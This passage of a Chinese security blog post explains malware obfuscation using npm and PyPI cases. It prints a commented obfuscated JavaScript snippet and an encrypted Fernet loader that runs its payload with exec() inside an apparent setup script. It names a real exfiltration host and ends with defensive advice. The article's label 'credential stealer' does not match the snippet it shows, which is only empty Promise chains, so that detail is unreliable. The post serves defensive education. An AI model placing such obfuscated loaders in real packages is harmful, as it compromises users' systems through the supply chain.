punctuation","children":"("}],["$","span",null,{"className":"token string","children":"\"Running in a safe or non-target environment.\""}],["$","span",null,{"className":"token punctuation","children":")"}],"\n"]}]]}]}],["$","h2",null,{"className":"content-header","id":"从理论到现实混淆技术实战","children":[["$","a",null,{"href":"#从理论到现实混淆技术实战","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"从理论到现实：混淆技术实战"]}],["$","p",null,{"children":"以上讨论了多种理论上的混淆技术，但现实世界中的恶意混淆是什么样的呢？安全公司的研究团队（如原文提到的 Socket）在各种生态系统中发现了大量真实案例。以下是一些在 npm 和 PyPI 包中检测到的实际威胁，展示了攻击者如何应用这些混淆方法来逃避检测、利用漏洞并危及系统安全。"}],["$","h3",null,{"className":"content-header","id":"npm-真实案例分析","children":[["$","a",null,{"href":"#npm-真实案例分析","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"npm 真实案例分析"]}],["$","$L12",null,{"className":"language-javascript","children":["$","code",null,{"className":"language-javascript code-highlight","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// let w = false; // 此变量在提供的片段中未使用，可能是更大代码块的一部分"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// const wait = () => { // wait 函数定义了一个复杂的立即执行函数表达式 (IIFE) 和Promise链"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \tvar _0x1262=['\\x74\\x68\\x65\\x6e']; // 1. 字符串数组混淆：将字符串 'then' 存储在数组中"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t(function(_0x1248e3,_0x53b88c){ // 2. IIFE 用于创建独立作用域，并可能进行数组移位/洗牌"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\tvar _0x1262eb=function(_0x27d80e){"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t\twhile(--_0x27d80e){"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t\t\t_0x1248e3['\\x70\\x75\\x73\\x68'](_0x1248e3['\\x73\\x68\\x69\\x66\\x74']()); // 数组旋转/移位操作"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t\t}"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t};"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t_0x1262eb(++_0x53b88c); // 执行数组移位"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t}(_0x1262,0xfa)); // 0xfa = 250, 移位250次"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \tvar _0x27d8=function(_0x1248e3,_0x53b88c){ // 3. 间接函数调用：定义一个函数用于从数组中获取元素"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t_0x1248e3=_0x1248e3-0xf7; // 0xf7 = 247, 对索引进行计算"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\tvar _0x1262eb=_0x1262[_0x1248e3];"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\treturn _0x1262eb;"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t};"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \tvar _0x1ee609=_0x27d8; // 变量别名，增加追踪难度"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \tPromise['\\x72\\x65\\x73\\x6f\\x6c\\x76\\x65'](()=>{}) // 4. 属性访问混淆：Promise.resolve 通过字符串拼接访问"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t['\\x74\\x68\\x65\\x6e'](()=>{}) // Promise.then"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// \t\t[_0x1ee609(0xf7)](()=>{}); // 实际调用 _0x27d8(247), 返回 _0x1262[0] 即 'then'"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// };"}],"\n"]}]]}]}],["$","p",null,{"children":[["$","strong",null,{"children":"解读："}]," 这段 JavaScript 代码是一个高度混淆的凭证窃取器。"]}],["$","ol",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"字符串数组混淆与移位"}],"：字符串 ",["$","code",null,{"className":"custom-code","children":"'then'"}]," 被存储在 ",["$","code",null,{"className":"custom-code","children":"_0x1262"}]," 数组中。IIFE（立即执行函数表达式）对这个数组执行了多次移位操作（将第一个元素移到末尾），使得在静态分析时很难直接看出 ",["$","code",null,{"className":"custom-code","children":"_0x1262[0]"}]," 的原始值。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"间接函数调用与索引计算"}],"：函数 ",["$","code",null,{"className":"custom-code","children":"_0x27d8"}]," (别名为 ",["$","code",null,{"className":"custom-code","children":"_0x1ee609"}],") 用于从移位后的数组中获取元素。注意 ",["$","code",null,{"className":"custom-code","children":"_0x1248e3=_0x1248e3-0xf7;"}]," 这一步，它对传入的参数（例子中是 ",["$","code",null,{"className":"custom-code","children":"0xf7"}],"）进行计算得到实际的数组索引。 ",["$","code",null,{"className":"custom-code","children":"_0x1ee609(0xf7)"}]," 会计算 ",["$","code",null,{"className":"custom-code","children":"0xf7 - 0xf7 = 0"}],"，所以最终访问的是移位后数组的第一个元素。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"属性访问混淆"}],"：",["$","code",null,{"className":"custom-code","children":"Promise"}]," 对象的方法名（如 ",["$","code",null,{"className":"custom-code","children":"resolve"}],", ",["$","code",null,{"className":"custom-code","children":"then"}],"）也是用编码后的字符串（如 ",["$","code",null,{"className":"custom-code","children":"\\x72..."}]," for 'resolve', ",["$","code",null,{"className":"custom-code","children":"\\x74..."}]," for 'then'）或通过上面那个间接函数 ",["$","code",null,{"className":"custom-code","children":"_0x1ee609(0xf7)"}]," 来访问的。 ",["$","code",null,{"className":"custom-code","children":"Promise['\\x72\\x65\\x73\\x6f\\x6c\\x76\\x65']"}]," 就是 ",["$","code",null,{"className":"custom-code","children":"Promise.resolve"}],"，",["$","code",null,{"className":"custom-code","children":"['\\x74\\x68\\x65\\x6e']"}]," 就是 ",["$","code",null,{"className":"custom-code","children":".then"}],"。最后的 ",["$","code",null,{"className":"custom-code","children":"[_0x1ee609(0xf7)]"}]," 也是 ",["$","code",null,{"className":"custom-code","children":".then"}],"。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"整体行为推测"}],"：该代码创建了一个空 ",["$","code",null,{"className":"custom-code","children":"Promise"}]," 并连续调用 ",["$","code",null,{"className":"custom-code","children":".then"}],"。这种结构本身可能无害，但通常在恶意软件中，这些空的 ",["$","code",null,{"className":"custom-code","children":"()=>{}"}]," 回调函数会被替换为实际的恶意操作，或者这种链式调用被用作延时、环境检测或更复杂控制流的一部分。原文解释它实现了30分钟延迟后将窃取到的凭证发送到 ",["$","code",null,{"className":"custom-code","children":"qooapp.herokuapp.com"}],"。这种延迟和复杂的混淆手段都是为了逃避安全监控。"]}]]}],["$","h3",null,{"className":"content-header","id":"pypi-真实案例分析","children":[["$","a",null,{"href":"#pypi-真实案例分析","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"PyPI 真实案例分析"]}],["$","$L12",null,{"className":"language-python","children":["$","code",null,{"className":"code-highlight language-python","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# from fernet import Fernet # Fernet 是一个对称加密库"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# # 1. Base64编码的加密密钥 和 加密的恶意代码"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# key = b'J8YKnvPEPLZNRm_nw8eL-CmUYkSwyXgjw7lEhHGRbjs='"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# encrypted_payload = b'gAAAAABmA1lfVy8Id9IYFHpxUElytS0hzBGFFBVfhPADNntNqVFk5lA4ihnrMrFXJUYrGuafAg8cXObYgzDxfgaQFsDsaDYgM5Whlh1x27fJAPE56R5LSQ-0RLrhjzVK-FW5OBXe3CaShMycB-4jI5SgaRmAnStca1mfniQm5PQ-YXATFnXQlsXtbNezHSLmIDY1OZ142ULls-37cF2OcT2PvKjN4USQA84-SxRToClOK4yGxGlSpjo='"}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# # 2. 运行时解密和执行"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# fernet_obj = Fernet(key)"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# decrypted_payload = fernet_obj.decrypt(encrypted_payload)"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# exec(decrypted_payload) # 3. 动态执行解密后的代码"}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# # install.run(self) # 这行代码表明它可能混在 setup.py 或类似安装脚本中"}],"\n"]}]]}]}],["$","p",null,{"children":[["$","strong",null,{"children":"解读："}]," 这段 Python 代码展示了使用加密来隐藏恶意负载的典型模式。"]}],["$","ol",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"加密负载"}],"：攻击者首先编写了恶意的 Python 代码，然后使用 Fernet 对称加密算法（或其他加密算法）将其加密。加密后的密文（",["$","code",null,{"className":"custom-code","children":"encrypted_payload"}],"）和加密所用的密钥（",["$","code",null,{"className":"custom-code","children":"key"}],"）被硬编码到发布的包中。注意，密钥和密文都以 ",["$","code",null,{"className":"custom-code","children":"b''"}]," 开头，表示它们是字节串，这对于加密操作是必要的。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"运行时解密"}],"：当这段代码执行时，它首先用硬编码的密钥实例化一个 ",["$","code",null,{"className":"custom-code","children":"Fernet"}]," 对象。然后，调用该对象的 ",["$","code",null,{"className":"custom-code","children":"decrypt"}]," 方法，传入加密的负载，得到解密后的原始恶意 Python 代码（字节串形式）。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"动态执行"}],"：最后，使用 ",["$","code",null,{"className":"custom-code","children":"exec()"}]," 函数执行解密后的恶意代码。",["$","code",null,{"className":"custom-code","children":"exec()"}]," 可以执行字符串形式的 Python 代码。"]}]]}],["$","p",null,{"children":"这种方法的隐蔽性在于，静态分析工具扫描源代码时，只能看到加密的字节串和密钥，无法直接看到原始的恶意指令。只有在代码实际运行时，恶意代码才会被解密并执行。这使得基于签名的检测和简单的静态分析难以奏效。"}],["$","h2",null,{"className":"content-header","id":"如何应对与防范","children":[["$","a",null,{"href":"#如何应对与防范","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"如何应对与防范？"]}],["$","p",null,{"children":"理解了这些混淆技术后，开发者和安全团队可以采取以下措施来加强防御："}],["$","ol",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"增强代码审查意识"}],"：对于引入的第三方库，尤其是来自不知名来源或行为可疑的包，进行更严格的代码审查。注意寻找上述混淆技术的迹象。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"利用去混淆工具"}],"：社区和商业公司提供了一些针对特定语言（如 JavaScript）的去混淆工具或在线服务，可以帮助还原部分混淆代码。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"动态分析与沙箱检测"}],"：在隔离的环境（沙箱）中运行可疑代码，监控其网络活动、文件系统更改和API调用，有助于发现其真实行为，即使代码被混淆。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"行为监控与启发式分析"}],"：安全工具不应仅依赖静态签名，还应结合行为分析和启发式规则来检测可疑模式，例如动态代码执行、非预期的网络连接等。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"供应链安全工具"}],"：使用专门的软件供应链安全工具，它们通常集成了依赖分析、漏洞扫描以及对已知恶意包和混淆模式的检测。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"限制不必要的权限"}],"：遵循最小权限原则，确保应用程序仅拥有其执行核心功能所必需的权限，减少潜在恶意代码的影响范围。"]}]]}],["$","h2",null,{"className":"content-header","id":"结论","children":[["$","a",null,{"href":"#结论","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"结论"]}],["$","p",null,{"children":"代码混淆是恶意软件作者军火库中一个强大且常用的工具。通过将代码变得难以阅读和分析，他们试图在数字世界中隐藏其踪迹。然而，通过深入理解这些混淆技术的原理，并结合先进的检测工具和警惕的人工审查，我们可以更好地揭开这些“隐形”威胁的面纱，保护我们的软件和系统免受侵害。持续学习和适应攻击者不断演变的技术是打赢这场攻防战的关键。"}]]}]}],["$","div",null,{"className":"pb-6 pt-6 text-center text-gray-700 dark:text-gray-300","id":"comment","children":["$","$L13",null,{"slug":"security/demystifying-obfuscation-techniques-in-malware"}]}],["$","footer",null,{"children":["$","div",null,{"className":"flex flex-col text-sm font-medium sm:flex-row sm:justify-between sm:text-base","children":[["$","div",null,{"className":"pt-4 xl:pt-8","children":["$","$L9",null,{"href":"/blog/security/zip-bombs-server-protection","className":"text-primary-500 hover:text-primary-600 dark:hover:text-primary-400","aria-label":"Previous post: 使用Zip炸弹保护您的Web服务器免受恶意爬虫攻击","children":["← ","使用Zip炸弹保护您的Web服务器免受恶意爬虫攻击"]}]}],["$","div",null,{"className":"pt-4 xl:pt-8","children":["$","$L9",null,{"href":"/blog/tools/git-enhanced-configuration","className":"text-primary-500 hover:text-primary-600 dark:hover:text-primary-400","aria-label":"Next post: 核心开发者的Git配置秘籍","children":["核心开发者的Git配置秘籍"," →"]}]}]]}]}]]}]]}]}]]}]]
10:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"揭秘恶意软件中的代码混淆把戏：深入原理与实例"}],["$","meta","3",{"name":"description","content":"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。"}],["$","meta","4",{"name":"robots","content":"index, follow"}],["$","meta","5",{"name":"googlebot","content":"index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1"}],["$","link","6",{"rel":"canonical","href":"https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware"}],["$","link","7",{"rel":"alternate","type":"application/rss+xml","href":"https://blog.mainjay.cloudns.ch/feed.xml"}],["$","meta","8",{"property":"og:title","content":"揭秘恶意软件中的代码混淆把戏：深入原理与实例"}],["$","meta","9",{"property":"og:description","content":"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。"}],["$","meta","10",{"property":"og:url","content":"https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware"}],["$","meta","11",{"property":"og:site_name","content":"MainJayLai Blog"}],["$","meta","12",{"property":"og:locale","content":"en_US"}],["$","meta","13",{"property":"og:image","content":"https://pngimg.com/uploads/github/github_PNG80.png"}],["$","meta","14",{"property":"og:type","content":"article"}],["$","meta","15",{"property":"article:published_time","content":"2025-05-09T00:00:00.000Z"}],["$","meta","16",{"property":"article:modified_time","content":"2025-05-09T00:00:00.000Z"}],["$","meta","17",{"property":"article:author","content":"mainJayLai"}],["$","meta","18",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","19",{"name":"twitter:title","content":"揭秘恶意软件中的代码混淆把戏：深入原理与实例"}],["$","meta","20",{"name":"twitter:description","content":"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。"}],["$","meta","21",{"name":"twitter:image","content":"https://pngimg.com/uploads/github/github_PNG80.png"}],["$","meta","22",{"name":"next-size-adjust"}]]
1:null
